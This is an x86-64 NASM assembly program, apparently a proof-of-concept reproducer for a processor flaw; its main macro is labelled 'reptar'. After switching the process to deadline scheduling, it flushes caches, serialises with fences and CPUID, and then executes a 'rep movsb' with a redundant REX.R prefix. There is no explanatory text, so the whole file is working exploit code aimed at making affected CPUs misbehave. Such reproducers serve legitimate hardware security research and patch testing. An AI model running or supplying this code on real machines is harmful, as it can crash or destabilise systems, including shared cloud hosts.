BITS 64

; rax ; USED (for CPUID temporarily)
; rbx ; USED (for CPUID temporarily)
; rcx ; USED (for CPUID and REP MOVSB)
; rdx ; USED (temporarily and for CPUID)
; rbp ; USED (magic 0xCC)
; rsp ; USED (for counter)
; rsi ; USED (for REP MOVSB)
; rdi ; USED (for REP MOVSB)
; r8  ; NOT USED
; r9  ; USED (data address)
; r10 ; NOT USED
; r11 ; NOT USED
; r12 ; NOT USED
; r13 ; NOT USED
; r14 ; NOT USED
; r15 ; NOT USED

global _start

%macro loopless_reptar 0
    align 128
    %%loop_for_every_iteration:
        ; FLUSH TO MAKE INSTRUCTIONS BELOW SLOW
        clflush [one]
        clflush [magic]
        clflush [r9]
        clflush [r9+64]
        clflush [r9+128]
        mfence
        lfence
        sfence
        cpuid

        add r9, [r9]
        mov rdx, [r9+64]
        lea rax, [r9]
        div qword [one+rdx]
        lea r9, [rax]
        mov rsi, [r9]
        cmp rbp, [magic+rsi+rdx]
        cmove rsi, r9
        mov rdi, [r9+128+rdx]
        lea rdi, [rsi+rdi]
        mov ecx, [one+rdx]
        xor ebp, ebp

        align 128
        %%reptar:
            rep
            db 0x44; rex.r
            movsb
        %%after_reptar:
            rep nop
            mov ebp, 0xcccccccc
            nop
%endmacro

section .bss
    struc sched_attr 
        size:             resd 1  ; Size of this structure
        sched_policy:     resd 1  ; Policy (SCHED_*)
        sched_flags:      resq 1  ; Flags
        sched_nice:       resd 1  ; Nice value (SCHED_OTHER, SCHED_BATCH)
        sched_priority:   resd 1  ; Static priority (SCHED_FIFO, SCHED_RR)
        sched_runtime:    resq 1  ;
        sched_deadline:   resq 1  ;
        sched_period:     resq 1  ;
        sched_util_min:   resd 1  ;
        sched_util_max:   resd 1  ;
    endstruc

section .data
    one: dq 0x1
    magic: dq 0xcccccccc
    data: times 512 db 0

    deadline_scheduled_attr: 
        istruc sched_attr
            at size, dd sched_attr_size ; SCHED_ATTR_SIZE_VER0
            at sched_policy, dd 6       ; SCHED_DEADLINE=6
            at sched_flags, dq 0        ; no flags
            at sched_nice, dd 0         ; nice (ignored?)
            at sched_priority, dd 0     ; priority (ignored)
            at sched_runtime,  dq 1000*1000 ; 
            at sched_deadline, dq 1000*1000 ; 
            at sched_period,   dq 1000*1000 ; same as deadline
            at sched_util_min, dd 0
            at sched_util_max, dd 0
        iend

section .text
    _start:
        mov r9, data
        mov ebp, 0xcccccccc
        xor rsp, rsp
        ; make sure these dont pf
        clflush [data]
        clflush [one]
        clflush [magic]
        mov rax, 314 ; sched_setattr
        mov rdi, 0   ; pid=0 for current
        mov rsi, deadline_scheduled_attr ; attr
        mov rdx, 0 ; flags
        syscall
        mov rax, 24 ; sched_yield
        syscall
        %rep 2
            loopless_reptar
            inc rsp
        %endrep
    .end_of_program:
    hlt
